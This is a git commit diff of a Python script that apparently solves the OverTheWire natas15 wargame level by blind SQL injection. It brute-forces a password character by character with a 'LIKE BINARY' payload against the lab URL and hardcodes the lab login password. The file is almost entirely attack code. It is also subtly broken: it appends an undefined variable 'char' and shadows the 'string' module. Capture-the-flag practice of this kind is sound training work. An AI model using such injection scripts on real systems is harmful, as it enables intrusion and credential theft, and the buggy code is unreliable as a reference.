c67fa6756a028a8a58f676d6fed662d565367038
AldairMerc <90732036+AldairMerc@users.noreply.github.com>
2024-05-23 09:08:18 -0600

    Update script.py
    Se agrega la request para que la request tenga permisos para realizarse (ya no da error 401)

--- script.py
+++ script.py
@@ -3,15 +3,28 @@ import string
 
 dic=''.join([string.ascii_letters, string.digits])
 url = 'http://natas15.natas.labs.overthewire.org/index.php'
+username = "natas15"
+pswd = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
 password = ''
+exists = "This user exists"
 
 for i in range(1,64):
 	for j in dic:
 		testString = password + j
 		string = 'natas16" AND password LIKE BINARY "'+testString+'%'
-		print(string)
-		res = requests.post(url+'?', data={'username':string})
+		uri= ''.join([url,'?',string])
+		res = requests.get(uri, auth=(username,pswd))
 		print(res)
-		if (res == "This user exists.<br>"):
+		if exists in res.text:
 			password += char
+			print(password)
+
 print(password)
+
+"""
+string = 'natas16 AND password LIKE BINARY T%'
+print(string)
+uri= ''.join([url,'?',string,'&debug'])
+res = requests.post(uri, auth=(username,pswd))
+print(res.text)"""
+
